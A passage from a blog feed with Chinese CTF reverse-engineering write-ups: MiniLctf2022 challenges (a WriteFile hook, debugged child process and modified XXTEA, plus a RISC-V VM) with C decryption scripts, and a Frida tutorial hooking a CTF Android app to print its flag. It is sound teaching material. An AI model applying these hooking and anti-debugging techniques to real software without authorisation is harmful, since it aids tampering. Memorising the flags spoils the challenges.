alt></p><p>先在注册的TLS_CALLBACK第二个函数下断点，然后F9</p><p><img src="/2022/05/05/MiniLctf2022/1651976351875.png" alt></p><h3 id="Hook掉WriteFile"><a class="header-anchor" href="#Hook掉WriteFile">¶</a>Hook掉WriteFile</h3><p><img src="/2022/05/05/MiniLctf2022/1651976372396.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651976527716.png" alt="Hook函数内部"></p><p>可以看到这里是遍历，然后只要地址等于WriteFile就将final函数的地址赋值过去，实现Hook</p><p><img src="/2022/05/05/MiniLctf2022/1651976683946.png" alt="Hook完成"></p><p>Hook之后ExitProcess</p><p><img src="/2022/05/05/MiniLctf2022/1651976714789.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651976845486.png" alt="结束所有进程和线程"></p><p>所以不会进入到main函数中</p><h3 id="第二次进入TLS-CALLBACK函数"><a class="header-anchor" href="#第二次进入TLS-CALLBACK函数">¶</a>第二次进入TLS_CALLBACK函数</h3><p>此时第二个参数变成了0，进入第二段</p><p>加载资源文件</p><p><img src="/2022/05/05/MiniLctf2022/1651977745611.png" alt></p><p>加载EXERES文件，然后xor_0x5F后创建tmp文件</p><blockquote><p>注意这里的WriteFile已经被Hook成我们的函数</p></blockquote><p><img src="/2022/05/05/MiniLctf2022/1651979822133.png" alt></p><p>修改值为6，其他正常写入，我们手动去文件修改</p><p><img src="/2022/05/05/MiniLctf2022/1651980030650.png" alt></p><p>下面这个函数是将取消Hook，也就是将WriteFile函数恢复</p><p>在Resources Hacker也可以找到资源文件</p><p><img src="/2022/05/05/MiniLctf2022/1651977808202.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651977842463.png" alt="生成tmp文件"></p><p><img src="/2022/05/05/MiniLctf2022/1651976997090.png" alt></p><blockquote><p><strong>CreateProcessA创建新进程，这个新进程运行指定的可执行文件tmp文件，也就是创建子进程</strong></p></blockquote><p><a href="https://baike.baidu.com/item/CreateProcess/11050419">https://baike.baidu.com/item/CreateProcess/11050419</a></p><p>这里的3代表的是新进程会被当做被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。</p><p><img src="/2022/05/05/MiniLctf2022/1651990868690.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651979411776.png" alt></p><p>此时也可以通过工具查看</p><p><img src="/2022/05/05/MiniLctf2022/1651977305230.png" alt></p><h3 id="DEBUG模式"><a class="header-anchor" href="#DEBUG模式">¶</a>DEBUG模式</h3><p><img src="/2022/05/05/MiniLctf2022/1651979468081.png" alt="进入该函数"></p><p>等待调试</p><p><img src="/2022/05/05/MiniLctf2022/1651979593455.png" alt></p><h3 id="子进程"><a class="header-anchor" href="#子进程">¶</a>子进程</h3><p>去tmp文件查看</p><p>注册一个异常处理函数</p><p><img src="/2022/05/05/MiniLctf2022/1651980146402.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651980174862.png" alt="异常处理函数"></p><p>当出现地址访问异常时，EIP+2</p><blockquote><p><strong>但是这里要注意因为子进程是DEBUG模式，所以优先让调试器也就是父进程处理</strong></p></blockquote><p>因为子进程是调试状态，所以这里要执行，也就是xxtea的常量进行异或，key[1]改为0x90</p><p><img src="/2022/05/05/MiniLctf2022/1651980332623.png" alt></p><h4 id="异常地址"><a class="header-anchor" href="#异常地址">¶</a>异常地址</h4><p><img src="/2022/05/05/MiniLctf2022/1651980405385.png" alt></p><p><img src="/2022/05/05/MiniLctf2022/1651980416658.png" alt="内存访问出错"></p><p>此时再去父进程看</p><p><img src="/2022/05/05/MiniLctf2022/1651980602332.png" alt></p><p>而EAX的值恰好是XXTEA的常量经过处理</p><p><img src="/2022/05/05/MiniLctf2022/1651980653548.png" alt="常量的处理"></p><h4 id="子进程通过文件映射通信"><a class="header-anchor" href="#子进程通过文件映射通信">¶</a>子进程通过文件映射通信</h4><p><img src="/2022/05/05/MiniLctf2022/1651980933549.png" alt></p><h4 id="xxtea"><a class="header-anchor" href="#xxtea">¶</a>xxtea</h4><p>最后就是xxtea，不过要注意这里的&gt;&gt;5都改成了&gt;&gt;6,也就是前面WirteFile时候改的数值</p><p><img src="/2022/05/05/MiniLctf2022/1651980951417.png" alt></p><p>脚本</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_DELTA ((((0x9E3779B9 ^0x90909090^ 0x12345678 ^ 0x7b)+12345))^0x1b207)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_MX (((xxtea_z&gt;&gt;6^xxtea_y<span class="meta-string">&lt;&lt;2) + (xxtea_y&gt;</span>&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(DWORD* xxtea_origin, <span class="keyword">int</span> xxtea_n, <span class="keyword">int</span> <span class="keyword">const</span> xxtea_key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">uint32_t</span> xxtea_y, xxtea_z, xxtea_sum;</span><br><span class="line">    <span class="keyword">unsigned</span> xxtea_p, xxtea_rounds, xxtea_e;</span><br><span class="line">    <span class="keyword">if</span> (xxtea_n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = <span class="number">0</span>;</span><br><span class="line">        xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_sum += xxtea_DELTA;</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = <span class="number">0</span>; xxtea_p &lt; xxtea_n - <span class="number">1</span>; xxtea_p++)</span><br><span class="line">            {</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p + <span class="number">1</span>];</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>] += xxtea_MX;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (xxtea_n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_n = -xxtea_n;</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = xxtea_rounds * xxtea_DELTA;</span><br><span class="line">        xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = xxtea_n - <span class="number">1</span>; xxtea_p &gt; <span class="number">0</span>; xxtea_p--)</span><br><span class="line">            {</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p - <span class="number">1</span>];</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>] -= xxtea_MX;</span><br><span class="line">            xxtea_sum -= xxtea_DELTA;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DC</span></span><br><span class="line"><span class="comment">//unsigned int enc[155] = { 3532577106, 1472742623, 3642468664, 4193500461, 2398676029, 617653972, 1474514999, 1471783658, 1012864704, 3615627536, 993855884, 438456717, 3358938551, 3906991208, 198959101, 3317190635, 3656923078, 613157871, 2398768861, 97286225, 2336972940, 1471645170, 3233163154, 583597118, 2863776301, 3183067750, 1384330715, 2929694742, 3522431804, 2181488067, 3303062236, 3825712422, 145643141, 2148976293, 2940910035, 506798154, 994590281, 2231904779, 3389770074, 2814269052, 1105937096, 1789727804, 3757028753, 2469686072, 1162286478, 680814033, 2934024098, 2162521262, 4048876895, 2121620700, 4240287315, 2391811140, 3396611602, 3091349617, 3031523010, 2486958601, 3164065171, 1285603712, 798920280, 2337813135, 4186055520, 3523024366, 1077514121, 1436444106, 2731983230, 1507202797, 500756149, 198754565, 2382448647, 880454148, 1970517398, 3217485349, 1161840191, 560498076, 1782600856, 2643721918, 1285196205, 788797746, 1195724574, 4061612551, 103427523, 2502688387, 4147162188, 617564657, 978211984, 1781482121, 2205798970, 3939973102, 3826603515, 659557668, 2582884932, 1561884856, 2217488804, 1189296962, 169145316, 2781742156, 1323893433, 824667876, 408202876, 3759637634, 4094868412, 1508996065, 162419237, 3732146944, 3083560189, 3955940127, 2393776934, 2470191468, 3620861513, 481927014, 2756226070, 3154651143, 1261069441, 2063238535, 2222237213, 101459755, 3159774417, 1721190841, 1078395785, 176506553, 3552913423, 1566142515, 1938949000, 1499289517, 3315102456, 829714860, 3843359394, 952932374, 1283577465, 2045007203, 3957761944, 3767891405, 2917089623, 3296133521, 482297421, 1734231412, 3670478932, 2575334979, 2827842737, 3413631016, 1533519803, 4008428470, 3890643173, 272960248, 317508587, 3299937500, 2440520601, 27470488, 1666674386, 1737927609, 750987808, 2385923471, 2694339191, 562925334, 2206035395 };</span></span><br><span class="line">    DWORD enc[<span class="number">18</span>] = { <span class="number">0x6B7CE328</span>, <span class="number">0x4841D5DD</span>, <span class="number">0x963784DC</span>, <span class="number">0xEF8A3226</span>, <span class="number">0x0776B226</span> };</span><br><span class="line">    <span class="comment">//unsigned int key[4] = {0x12,0x90,0x56,0x78};</span></span><br><span class="line">    <span class="keyword">int</span> key[<span class="number">4</span>] = { <span class="number">0x12</span>,<span class="number">0x90</span>,<span class="number">0x56</span>,<span class="number">0x78</span> };</span><br><span class="line">    xxtea(enc, <span class="number">-5</span>, key);<span class="comment">//长度为多少，解密时第二个参数就改为多长</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>, ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">0</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">1</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">2</span>], ((<span class="keyword">char</span>*)&amp;enc[i])[<span class="number">3</span>]);</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* char s[] = "3e90c91c02e9b40b78b}";</span></span><br><span class="line"><span class="comment">    printf("%d", strlen(s));*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>剩下的一部分也是xxtea，没魔改就不说了</p><h1 id="What-assembly"><a class="header-anchor" href="#What-assembly">¶</a>What assembly</h1><h2 id="考点：WASM逆向"><a class="header-anchor" href="#考点：WASM逆向">¶</a>考点：WASM逆向</h2><p><a href="https://www.52pojie.cn/thread-962068-1-1.html">https://www.52pojie.cn/thread-962068-1-1.html</a></p><p><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p><p>wasm动态调试</p><p>利用python3在与<code>.html</code>、<code>.js</code>、<code>.wasm</code>文件同目录下开启http服务。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">8888</span></span><br></pre></td></tr></tbody></table></figure><p>然后在浏览器输入http://127.0.0.1:8888/MiniLctf-2022.html</p><p>下断点动态调试</p><h2 id="过程"><a class="header-anchor" href="#过程">¶</a>过程</h2><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wasm<span class="number">2</span><span class="keyword">c</span> flag.wasm -o flag.<span class="keyword">c</span></span><br></pre></td></tr></tbody></table></figure><p>生成flag.c和flag.h</p><p>将之前反编译出来的wasm.c，wasm.h，以及wabt项目内的wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h三个文件放到同一个文件夹。</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">c</span> flag.<span class="keyword">c</span> -o final.o</span><br></pre></td></tr></tbody></table></figure><p>生成.o文件， 因为很多wasm的函数没有具体的实现，我们不需要编译链接生成elf文件</p><p>别问为什么没有了，问就是不知道怎么动调，摆了</p><h1 id="NotRC4"><a class="header-anchor" href="#NotRC4">¶</a>NotRC4</h1><h2 id="考点：RISV架构"><a class="header-anchor" href="#考点：RISV架构">¶</a>考点：RISV架构</h2><p>使用readelf可以知道是RISV架构</p><p><img src="/2022/05/05/MiniLctf2022/1651987423786.png" alt></p><h2 id="过程-v2"><a class="header-anchor" href="#过程-v2">¶</a>过程</h2><p>ida无法反编译，jeb可以反编译但是效果不太好，最好的还是Ghidra</p><p>就是一个VM题</p><p>分析完大概就是这样</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">final</span>[<span class="number">4</span>] = {</span><br><span class="line"><span class="number">0x4BC21DBB95EF82CA</span>, <span class="number">0xF57BECAE71B547BE</span>, <span class="number">0x80A1BDAB15E7F6CD</span>, <span class="number">0xA3C793D7E1776385</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> opcode[<span class="number">23</span>] = {</span><br><span class="line"><span class="number">0xF3</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF3</span>, <span class="number">0x02</span>, <span class="number">0xF4</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>,</span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0x00</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">//F1对应的指令</span></span><br><span class="line"><span class="comment">//compare,long型的判断</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//F2</span></span><br><span class="line"><span class="comment">//循环的操作，和0x0B作比较，作为循环的次数，而4是指回到前四个指令的位置，实现循环</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//F3，取出输入然后加上yyds和dbt!(小端序)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//F4加密操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//F5,存储</span></span><br><span class="line"><span class="keyword">int</span> key[<span class="number">2</span>] = { <span class="number">0x64627421</span>, <span class="number">0x79796473</span> };</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tmp1 = <span class="keyword">final</span>[i] + key[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tmp2 = <span class="keyword">final</span>[i + <span class="number">1</span>] + key[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x0C</span>; ++j)</span><br><span class="line">{</span><br><span class="line">tmp1 = ((tmp1 ^ tmp2) &gt;&gt; (-(<span class="keyword">char</span>)tmp2) &amp; <span class="number">0x3f</span>) | ((tmp1 ^ tmp2) &lt;&lt; ((<span class="keyword">char</span>)tmp2) &amp; <span class="number">0x3f</span>) + key[<span class="number">0</span>];</span><br><span class="line">tmp2 = ((tmp1 ^ tmp2) &gt;&gt; (-(<span class="keyword">char</span>)tmp1) &amp; <span class="number">0x3f</span>) | ((tmp1 ^ tmp2) &lt;&lt; ((<span class="keyword">char</span>)tmp1) &amp; <span class="number">0x3f</span>) + key[<span class="number">1</span>];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">final</span>[i] = tmp1;</span><br><span class="line"><span class="keyword">final</span>[i + <span class="number">1</span>] = tmp2;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>脚本</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp1 = <span class="keyword">final</span>[i];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tmp2 = <span class="keyword">final</span>[i + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x0C</span>; ++j)</span><br><span class="line">{</span><br><span class="line">tmp2 = ((((tmp2 - key[<span class="number">1</span>]) &amp; <span class="number">0xffffffffffffffff</span>) &lt;&lt; ((-(<span class="keyword">char</span>)tmp1) &amp; <span class="number">0x3f</span>)) | (((tmp2 - key[<span class="number">1</span>]) &amp; <span class="number">0xffffffffffffffff</span>) &gt;&gt; (((<span class="keyword">char</span>)tmp1) &amp; <span class="number">0x3f</span>))) ^ tmp1;</span><br><span class="line">tmp1 = ((((tmp1 - key[<span class="number">0</span>]) &amp; <span class="number">0xffffffffffffffff</span>) &lt;&lt; ((-(<span class="keyword">char</span>)tmp2) &amp; <span class="number">0x3f</span>)) | (((tmp1 - key[<span class="number">0</span>]) &amp; <span class="number">0xffffffffffffffff</span>) &gt;&gt; (((<span class="keyword">char</span>)tmp2) &amp; <span class="number">0x3f</span>))) ^ tmp2;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">final</span>[i] = tmp1 - key[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">final</span>[i+<span class="number">1</span>] = tmp2 - key[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c%c%c%c%c"</span>, ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">0</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">1</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">2</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">3</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">4</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">5</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">6</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i])[<span class="number">7</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c%c%c%c%c"</span>, ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">0</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">1</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">2</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">3</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">4</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">5</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">6</span>], ((<span class="keyword">char</span>*)&amp;<span class="keyword">final</span>[i+<span class="number">1</span>])[<span class="number">7</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目质量很高，我也是真的菜&lt;/p&gt;</summary>
    
    
    
    <category term="Competition" scheme="https://gift1a.github.io/categories/Competition/"/>
    
    
    <category term="Competition" scheme="https://gift1a.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>Frida-Hook</title>
    <link href="https://gift1a.github.io/2022/05/01/Frida-Hook/"/>
    <id>https://gift1a.github.io/2022/05/01/Frida-Hook/</id>
    <published>2022-04-30T21:18:23.000Z</published>
    <updated>2022-05-05T06:01:43.455Z</updated>
    
    <content type="html"><![CDATA[<p>Frida-Hook</p><span id="more"></span><h1 id="0x00-示例"><a class="header-anchor" href="#0x00-示例">¶</a>0x00-示例</h1><h2 id="0x00-配置环境"><a class="header-anchor" href="#0x00-配置环境">¶</a>0x00-配置环境</h2><h3 id="Frida安装"><a class="header-anchor" href="#Frida安装">¶</a>Frida安装</h3><p>直接pip install  frida-tools、pip install frida即可</p><h3 id="Frida-server"><a class="header-anchor" href="#Frida-server">¶</a>Frida-server</h3><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro<span class="selector-class">.product</span><span class="selector-class">.cpu</span>.abi</span><br></pre></td></tr></tbody></table></figure><p>查看CPU信息</p><p>选择对应手机版本的即可</p><p><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><h3 id="配置手机端"><a class="header-anchor" href="#配置手机端">¶</a>配置手机端</h3><p><img src="/2022/05/01/Frida-Hook/1651354655163.png" alt></p><p>先将frida-server文件存至手机文件夹data/local/tmp中</p><p>然后授权</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">adb</span> forward tcp:<span class="number">27042</span> tcp:<span class="number">27042</span></span><br></pre></td></tr></tbody></table></figure><p>端口转发</p><h2 id="0x01-代码审计"><a class="header-anchor" href="#0x01-代码审计">¶</a>0x01-代码审计</h2><p>这是Namahonctf的一道Mobile题</p><p><img src="/2022/05/01/Frida-Hook/1651356220172.png" alt></p><p>从这里可以看出这里只需要点击的次数为0x5F5E0FF即可获得flag，所以采用自动化工具更为方便</p><h2 id="0x02-编写脚本"><a class="header-anchor" href="#0x02-编写脚本">¶</a>0x02-编写脚本</h2><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">    <span class="keyword">var</span> click = Java.use(<span class="string">"com.example.clickme.MainActivity"</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> run = click.$new();</span><br><span class="line">    <span class="keyword">var</span> returnvalue = run.getFlag();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">""</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Flag: "</span> + returnvalue);</span><br><span class="line">  });</span><br></pre></td></tr></tbody></table></figure><p>先让frida-server处于开启状态</p><p><img src="/2022/05/01/Frida-Hook/1651355616556.png" alt></p><p>在手机中打开程序，通过以下命令查找进程</p><p><img src="/2022/05/01/Frida-Hook/1651354746522.png" alt></p><p>开启</p><p><img src="/2022/05/01/Frida-Hook/1651355383018.png" alt></p><p>-U 连接USB设备<br>-l 加载JavaScript脚本文件<br>-f表示包名</p><p>–no–pause表示没有暂停</p><h1 id="0x03-Frida简介"><a class="header-anchor" href="#0x03-Frida简介">¶</a>0x03-Frida简介</h1><p>在反编译时我们难以知道某个函数在被调用时所传入的参数和他返回的值，这样增加了我们逆向的复杂性</p><p>而使用HOOK可以让我们知道被传入的参数和返回值</p><blockquote><p><strong>Hook的原理简单来说就是用一个新的函数替代掉原来的函数，在这个新的函数中你想做什么都可以</strong></p></blockquote><p>而Frida就是一个很常用的Hook工具（python+js接口），只需要编写一段Javascript代码就能对指定的函数进行Hook</p><p><a href="https://www.anquanke.com/post/id/197670#h2-5">https://www.anquanke.com/post/id/197670#h2-5</a></p><p>Frida还可以用来<strong>访问进程的内存、应用程序运行时覆盖功能、从导入的类调用函数、动态Hook跟踪、拦截函数等</strong></p><p><strong>Frida基础语法</strong></p><p><a href="https://www.anquanke.com/post/id/195215">https://www.anquanke.com/post/id/195215</a></p><p><a href="https://blog.csdn.net/LoopherBear/article/details/107085949">https://blog.csdn.net/LoopherBear/article/details/107085949</a></p><p><a href="https://zyzling.gitee.io/2020/05/12/Frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%EF%BC%88%E6%8A%84%E7%9A%84%EF%BC%89">https://zyzling.gitee.io/2020/05/12/Frida学习笔记/#简单脚本（抄的）</a></p><p><a 